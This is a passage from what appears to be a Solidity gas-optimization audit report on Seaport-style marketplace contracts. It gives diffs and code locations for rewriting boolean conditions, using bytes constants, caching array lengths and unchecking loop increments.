concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>Compare in Remix this example contract’s 2 diffs (or any test-contract of your choice, as experimentation always show the same results):</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">pragma solidity 0.8.13;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">contract Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    bool isOpen;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    bool channelPreviouslyOpen;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function boolTest() external view returns (uint) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       if (isOpen &amp;&amp; !channelPreviouslyOpen) { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       if (!(!isOpen || channelPreviouslyOpen)) { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            return 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       } else if (!isOpen &amp;&amp; channelPreviouslyOpen) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       } else if (!(isOpen || !channelPreviouslyOpen)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            return 2;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function setBools(bool _isOpen, bool _channelPreviouslyOpen) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        isOpen = _isOpen;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        channelPreviouslyOpen= _channelPreviouslyOpen;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ul>\n<li>Notice that, even with the 10k Optimizer, the red diff version costs <strong>8719 gas</strong>, while the green diff version costs <strong>8707 gas</strong>, effectively <strong>saving 12 gas</strong>.</li>\n</ul>\n<h3 id=\"affected-code\" style=\"position:relative;\"><a href=\"#affected-code\" aria-label=\"affected code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Affected Code</h3>\n<p>Added together, it’s possible to save a significant amount of gas by replacing the <code>&#x26;&#x26;</code> conditions by their <code>||</code> equivalent in the solution.</p>\n<ul>\n<li><code>ConduitController.sol#updateChannel()</code></li>\n</ul>\n<p>Use <code>!(!isOpen || channelPreviouslyOpen)</code> instead of <code>isOpen &#x26;&#x26; !channelPreviouslyOpen</code> and use <code>!(isOpen || !channelPreviouslyOpen)</code> instead of <code>!isOpen &#x26;&#x26; channelPreviouslyOpen</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: ConduitController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 141:         if (isOpen &amp;&amp; !channelPreviouslyOpen) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 141:         if (!(!isOpen || channelPreviouslyOpen))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 149:         } else if (!isOpen &amp;&amp; channelPreviouslyOpen) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 149:         } else if (!(isOpen || !channelPreviouslyOpen))</span></span></span></code></pre>\n<ul>\n<li><code>OrderValidator.sol#_validateOrderAndUpdateStatus()</code></li>\n</ul>\n<p>Use <code>!(!(numerator &#x3C; denominator) || !_doesNotSupportPartialFills(orderParameters.orderType))</code> instead of <code>numerator &#x3C; denominator &#x26;&#x26; _doesNotSupportPartialFills(orderParameters.orderType</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">contracts/lib/OrderValidator.sol:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  142          if (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  143:             numerator &lt; denominator &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  144              _doesNotSupportPartialFills(orderParameters.orderType)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  143:             !(!(numerator &lt; denominator) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  144              !_doesNotSupportPartialFills(orderParameters.orderType))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  145          ) {</span></span></span></code></pre>\n<ul>\n<li><code>OrderValidator.sol#_cancel()</code></li>\n</ul>\n<p>Use <code>!(msg.sender == offerer || msg.sender == zone)</code> instead of <code>msg.sender != offerer &#x26;&#x26; msg.sender != zone</code> here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  280:                 if (msg.sender != offerer &amp;&amp; msg.sender != zone) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  280:                 if (!(msg.sender == offerer || msg.sender == zone))</span></span></span></code></pre>\n<ul>\n<li><code>SignatureVerification.sol#_assertValidSignature()</code></li>\n</ul>\n<p>Use <code>!(v == 27 || v == 28)</code> instead of <code>v != 27 &#x26;&#x26; v != 28</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">contracts/lib/SignatureVerification.sol:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  78:             if (v != 27 &amp;&amp; v != 28) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  78:             if (!(v == 27 || v == 28))</span></span></span></code></pre>\n<ul>\n<li><code>ZoneInteraction.sol#_assertRestrictedBasicOrderValidity()</code></li>\n</ul>\n<p>Use <code>!(!(uint256(orderType) > 1) || msg.sender == zone || msg.sender == offerer)</code> instead of <code>uint256(orderType) > 1 &#x26;&#x26; msg.sender != zone &#x26;&#x26; msg.sender != offerer</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">contracts/lib/ZoneInteraction.sol:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   46          if (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   47:             uint256(orderType) &gt; 1 &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   48:             msg.sender != zone &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   49              msg.sender != offerer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   47:             !(!(uint256(orderType) &gt; 1) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   48:             msg.sender == zone ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   49              msg.sender == offerer)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   50          ) {</span></span></span></code></pre>\n<ul>\n<li><code>ZoneInteraction.sol#_assertRestrictedAdvancedOrderValidity()</code> (1)</li>\n</ul>\n<p>Use <code>!(!(uint256(orderType) > 1) || msg.sender == zone || msg.sender == offerer)</code> instead of <code>uint256(orderType) > 1 &#x26;&#x26; msg.sender != zone &#x26;&#x26; msg.sender != offerer</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  115          if (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  116:             uint256(orderType) &gt; 1 &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  117:             msg.sender != zone &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  118              msg.sender != offerer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  116:             !(!(uint256(orderType) &gt; 1) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  117:             msg.sender == zone ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  118              msg.sender == offerer)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  119          ) {</span></span></span></code></pre>\n<ul>\n<li><code>ZoneInteraction.sol#_assertRestrictedAdvancedOrderValidity()</code> (2)</li>\n</ul>\n<p>Use <code>!(advancedOrder.extraData.length != 0 || criteriaResolvers.length != 0)</code> instead of <code>advancedOrder.extraData.length == 0 &#x26;&#x26; criteriaResolvers.length == 0</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  121              if (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  122:                 advancedOrder.extraData.length == 0 &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  123                  criteriaResolvers.length == 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  122:                 !(advancedOrder.extraData.length != 0 ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  123                  criteriaResolvers.length != 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  124              ) {</span></span></span></code></pre>\n<h2 id=\"g-11--bytes-constants-are-more-efficient-than-string-constants\" style=\"position:relative;\"><a href=\"#g-11--bytes-constants-are-more-efficient-than-string-constants\" aria-label=\"g 11  bytes constants are more efficient than string constants permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11]  Bytes constants are more efficient than string constants</h2>\n<p>From the <a href=\"%5Bhttps://docs.soliditylang.org/en/develop/types.html#dynamically-sized-byte-array%5D(https://docs.soliditylang.org/en/develop/types.html#dynamically-sized-byte-array)\">Solidity doc</a>:</p>\n<blockquote>\n<p>If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper.</p>\n</blockquote>\n<p><a href=\"https://ethereum.stackexchange.com/questions/3795/why-solidity-uses-bytes32-type-instead-of-string\">Why do Solidity examples use bytes32 type instead of string?</a></p>\n<blockquote>\n<p>bytes32 uses less gas because it fits in a single word of the EVM, and string is a dynamically sized-type which has current limitations in Solidity (such as can’t be returned from a function to a contract).</p>\n</blockquote>\n<p>If data can fit into 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is cheaper in solidity. Basically, any fixed size variable in solidity is cheaper than variable size. That will save gas on the contract.</p>\n<p>Instances of <code>string constant</code> that can be replaced by <code>bytes(1..32) constant</code> :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">reference</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReferenceConsiderationBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">29</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_NAME</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;Consideration&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">30</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_VERSION</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;rc.1&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g-12-an-arrays-length-should-be-cached-to-save-gas-in-for-loops\" style=\"position:relative;\"><a href=\"#g-12-an-arrays-length-should-be-cached-to-save-gas-in-for-loops\" aria-label=\"g 12 an arrays length should be cached to save gas in for loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] An array’s length should be cached to save gas in for-loops</h2>\n<p>Reading array length at each iteration of the loop consumes more gas than necessary.</p>\n<p>In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration.\nIn the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.</p>\n<p>Here, lengths are only read from memory.</p>\n<p>Consider storing the array’s length in a variable before the for-loop, and use this newly created variable instead:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">247</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">offer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">291</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">598</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">621</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">executions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">217</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">306</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span></code></pre>\n<h2 id=\"g-13-increments-can-be-unchecked\" style=\"position:relative;\"><a href=\"#g-13-increments-can-be-unchecked\" aria-label=\"g 13 increments can be unchecked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-13] Increments can be unchecked</h2>\n<p>In Solidity 0.8+, there’s a default overflow check on unsigned integers. It’s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.</p>\n<p><a href=\"https://github.com/ethereum/solidity/issues/10695\">ethereum/solidity#10695</a></p>\n<h3 id=\"affected-code-1\" style=\"position:relative;\"><a href=\"#affected-code-1\" aria-label=\"affected code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Affected code</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CriteriaResolution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">56</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalCriteriaResolvers</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CriteriaResolution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">166</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalAdvancedOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CriteriaResolution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">184</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalItems</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CriteriaResolution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">199</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalItems</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">181</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">247</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span 